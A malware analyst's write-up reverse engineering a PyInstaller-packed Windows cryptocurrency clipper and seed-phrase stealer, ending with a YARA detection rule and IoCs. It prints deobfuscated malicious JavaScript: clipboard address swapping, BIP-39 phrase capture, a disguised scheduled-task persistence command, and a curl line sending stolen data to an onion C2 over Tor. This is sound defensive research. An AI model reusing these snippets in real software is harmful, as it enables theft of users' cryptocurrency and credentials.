* **Author:** Manohar Gonohal
* **Date:** July 26, 2026
* **Target File:** `bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795.exe`
* **Threat Classification:** Clipper & Cryptocurrency Wallet Stealer

---
## Executive Summary
Hey there! I'm documenting my end-to-end reverse engineering journey of a pretty sneaky, highly obfuscated executable. Initial triaging indicated a PyInstaller-packaged loader. Deep static and dynamic analysis revealed multiple anti-analysis protections, custom dynamic API loading, PyArmor obfuscation, and a resource payload encrypted with a 12-byte repeating XOR key. 

Once decrypted, the true payload was identified: a WSH (Windows Script Host) based cryptocurrency clipper that monitors clipboards for BIP-39 seed phrases ([What is a BIP-39 seed phrase -- a few tips for handling your seed words safely : r/Bitcoin](https://www.reddit.com/r/Bitcoin/comments/1598e7e/what_is_a_bip39_seed_phrase_a_few_tips_for/)) and redirects BTC transactions to attacker-controlled wallets.

---

## Phase 1: Static PE & Ghidra Analysis

### 1.1 Anti-Analysis & Debugger Detection
When I first imported the executable into Ghidra, I noticed right away that the author included several classic anti-analysis and anti-debugging tricks to trip up analysts and automated sandboxes:

* **Invalid `CloseHandle` Traps:** The binary deliberately calls `CloseHandle` on invalid handle values inside functions like `ProcessPyInstallerChild`. On a regular system, this fails quietly; under a debugger, it triggers a `STATUS_INVALID_HANDLE` exception to crash the debugging session.
* **Timing Checks:** I found calls to `QueryPerformanceCounter` and `GetSystemTimeAsFileTime` wrapped around key code blocks to measure execution delays and detect if someone is single-stepping through code.
* **Fast Fail Protections:** Hardcoded checks like `IsDebuggerPresent` coupled with `SetUnhandledExceptionFilter(0)` ensure that if an exception occurs under analysis, the process instantly terminates.

Here is the decompiled snippet I pulled from Ghidra showing this exact exception filter and debugger check combo:

```c
void HandleSecurityFailure(undefined4 param_1) {
  // ... [context capture and stack unwinding] ...
  
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter((_EXCEPTION_POINTERS *)(puVar4 + 0x40));
  
  if ((LVar3 == 0) && (BVar2 != 1)) {
    FUN_14000e344(); // Fast Fail execution
  }
  return;
}
```

### 1.2 Dynamic API Resolving
To keep import scanners in the dark, the malware hides its sensitive Windows API calls instead of putting them in the Import Address Table (IAT). I reversed two key dynamic API resolution routines:

* **`ResolveDynamicApiWithProtection` (formerly `FUN_14002105c`):** Dynamically resolves functions using `LoadLibraryExW` and `GetProcAddress`, while tweaking memory page permissions with `VirtualProtect`.
* **`ResolveDynamicApiStandard` (formerly `FUN_14000f178`):** Handles internal caching of resolved DLL pointers.

### 1.3 Identifying the PyInstaller Bootloader
After tracing the core execution loop, I renamed the main function to `ProcessPyInstallerChild` (formerly `FUN_14000a000`). It registers a window class called `PyInstallerOnefileHiddenWindow` and spawns a hidden window `PyInstaller Onefile Hidden Window` to manage child processes extracted to disk.

---

## Phase 2: Extracting the PyInstaller Archive

Knowing I was dealing with a PyInstaller bundle, I ran `pyinstxtractor.py` to unpack the file structure:

```powershell
python pyinstxtractor.py bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795.exe
```

The tool successfully extracted the inner archive, giving me access to compiled Python bytecode files (`.pyc`), internal dependencies, and an extracted payload directory.

Looking closely at `installer.pyc`, I noticed the magic header bytes `PY000000`. This told me the primary Python script was packed with **PyArmor** obfuscation, preventing simple Python bytecode decompilation right off the bat.

---

## Phase 3: Cryptanalysis & Payload Decryption

Once `pyinstxtractor` finished dumping the archive contents, I immediately noticed an interesting subfolder named `data_p002`. Inside, there were several files with gibberish headers. For instance, `uusd.exe` didn't start with the standard `MZ` header at all—it started with `!cMy...`.

### 3.1 Breaking the 12-Byte XOR Encryption
Looking at the raw hex of `uusd.exe`, I spotted a repeating 12-byte hex pattern:
`6c 39 35 79 5a 58 42 73 4f 50 59 76`

Since Windows PE files are packed with big chunks of null bytes (`0x00`), XORing null bytes with an encryption key conveniently leaks the key itself! I wrote a quick Python script to test XORing the encrypted header against this key, and sure enough, out popped the standard `MZ` header and the classic DOS message `"This program cannot be run in DOS mode."`

**Encrypted File Stream (`uusd.exe`):**
```hex
00000000  21 63 4d 79 5b 58 42 73  4b 50 59 76 6c 39 35 79  |!cMy[XBsKPYvl95y|
00000010  5a 58 42 73 4f 50 59 76  2c 39 35 79 5a 58 42 73  |ZXBsOPYv,95yZXBs|
```

**Decrypted File Stream (`uusd.exe`):**
```hex
00000000  4d 5a 78 00 01 00 00 00  04 00 00 00 00 00 00 00  |MZx.............|
00000010  00 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
```

Using this XOR key (`6c 39 35 79 5a 58 42 73 4f 50 59 76`), I decrypted every file inside `data_p002`.

---

## Phase 4: JavaScript Deobfuscation with Webcrack & C2 Reversing

After running the XOR decryption on the `data_p002` folder, I ended up with several obfuscated JavaScript files like `002_n.js`, `002_b.js`, and `pack.js`. 

To clean up the heavy JavaScript obfuscation (string array rotations and evaluation wrappers), I used **webcrack** to deobfuscate the scripts into readable code.

### 4.1 Deobfuscated JavaScript Code & Malicious Capabilities

Once webcrack processed the JavaScript files, the full malicious functionality was laid bare:

#### A. Clipboard Monitoring & Bitcoin Address Swapping
The script uses `htmlfile` / `parentWindow.clipboardData` to continuously read clipboard contents. When it detects a Bitcoin address format (e.g., matching `1...` or `bc1...`), it replaces it with a matching wallet address from `002a.txt` (a 1.5 MB list of pre-generated attacker addresses):

```javascript
// Deobfuscated snippet from 002_n.js
var clipboardText = htmlDocument.parentWindow.clipboardData.getData("Text");

if (isBtcAddress(clipboardText)) {
    var replacementAddress = getMatchingAttackerAddress(clipboardText, "002a.txt");
    if (replacementAddress) {
        htmlDocument.parentWindow.clipboardData.setData("Text", replacementAddress);
    }
}
```

#### B. BIP-39 Seed Phrase Stealing
The script compares words copied to the clipboard against `002w.txt` (a standard BIP-39 wordlist). If a user copies a 12- or 24-word recovery phrase, the script captures it for exfiltration:

```javascript
// Deobfuscated snippet checking BIP-39 seed words
var words = clipboardText.toLowerCase().split(/\s+/);
if (words.length >= 12 && words.every(w => bip39Wordlist.includes(w))) {
    exfiltrateSeedPhrase(clipboardText);
}
```

#### C. Persistence via Scheduled Task (`002.xml`)
The script automatically schedules a Windows task using `002.xml` to re-execute every minute:

```javascript
// Task creation command built dynamically
var shell = new ActiveXObject("WScript.Shell");
shell.Run("schtasks /create /xml \"002.xml\" /tn \"WindowsUpdateCheck\"", 0, true);
```

#### D. Tor SOCKS5 Proxy C2 Communication
To send stolen data back anonymously, the script connects via a local Tor SOCKS5 proxy on port 9050:

```javascript
// Tor proxy command construction
var cmd = "curl --socks5-hostname localhost:9050 -X POST -F \"data=" + stolenData + "\" http://" + onionHost + "3ad.onion/route.php";
shell.Run(cmd, 0, false);
```

### 4.2 Discovered C2 Onion Segments
The deobfuscated JavaScript dynamically stitches together onion host strings:

* **Group A (`002_b.js`):** `hxxp[:]//gfo[hash]3ad[.]onion/route[.]php`
* **Group B (`002_n.js`):** `hxxp[:]//swj[hash]ead[.]onion/route[.]php` and `hxxp[:]//hek[hash]yid[.]onion/route[.]php`

---

## Phase 5: Payload Summary Table

Here is a quick breakdown of what each file in the decrypted payload directory actually does:

| File Name | Decrypted Type | Purpose / Description |
| :--- | :--- | :--- |
| **`uusd.exe`** | Win32 PE Executable (8.9 MB) | Main binary agent loaded and run in the background. |
| **`002.xml`** | XML Task Schema | Scheduled task configuration designed to run every 1 minute for persistence. |
| **`002a.txt`** | Text File (1.5 MB) | Dictionary of thousands of Bitcoin P2PKH addresses used for address swapping. |
| **`002w.txt`** | Text File | Official BIP-39 English wordlist used for detecting copied crypto seed phrases. |
| **`002_b.js` / `002_n.js`** | WSH JavaScript | Main clipper & stealer controllers (deobfuscated via webcrack). |
| **`pack.js`** | JavaScript | Helper wrapper for script execution. |

---

## YARA Hunting Rule

I created the following YARA rule to hunt for both the encrypted file signatures and the decrypted WSH payloads:

```yara
rule Clipper_Campaign_data_p002 {
    meta:
        description = "Detects cryptocurrency clippers/stealers matching the data_p002 campaign"
        author = "Manohar Gonohal"
        date = "2026-07-26"
        hash = "bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795"

    strings:
        // Encrypted PE Header signature (using 12-byte XOR key)
        $enc_pe_header = { 21 63 4d 79 5b 58 42 73 4b 50 59 76 6c 39 35 79 5a 58 42 73 4f 50 59 76 }

        // Tor C2 components
        $c2_onion_1 = "3ad.onion" ascii wide
        $c2_onion_2 = "ead.onion" ascii wide
        $c2_onion_3 = "yid.onion" ascii wide
        $c2_route = "route.php" ascii wide

        // Registry & payload file paths
        $file_indicator_1 = "data_p002" ascii wide
        $file_indicator_2 = "uusd.exe" ascii wide
        $file_indicator_3 = "002.xml" ascii wide
        $file_indicator_4 = "002a.txt" ascii wide
        
        // JS WSH Script techniques
        $js_tech_1 = "ActiveXObject" ascii wide
        $js_tech_2 = "WScript.Shell" ascii wide
        $js_tech_3 = "winmgmts:\\x5c" ascii wide
        $js_tech_4 = "socks5-h" ascii wide

    condition:
        // Detects either the encrypted uusd.exe header, loader paths, C2 domains, or WSH clipper scripts
        $enc_pe_header or (any of ($c2_onion_*)) or (2 of ($file_indicator_*)) or (3 of ($js_tech_*))
}
```

You can view live hunting search results for this rule on Hybrid-Analysis here:  
 [Hybrid-Analysis YARA Search Results](https://hybrid-analysis.com/yara-search/results/48c0acd3222ba153a9c13cf83aed1140b59049b1929018d8a1eef53d330d0d24)

---

## Indicators of Compromise (IoCs)
* **File Hash (Loader):** `bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795` (EXE)
* **Encryption Key:** `6c 39 35 79 5a 58 42 73 4f 50 59 76` (12-byte XOR)
* **Suspicious Directory:** `data_p002`
* **Persistence Mechanism:** Windows Scheduled Task running every minute targeting `002_n.js` / `uusd.exe`.
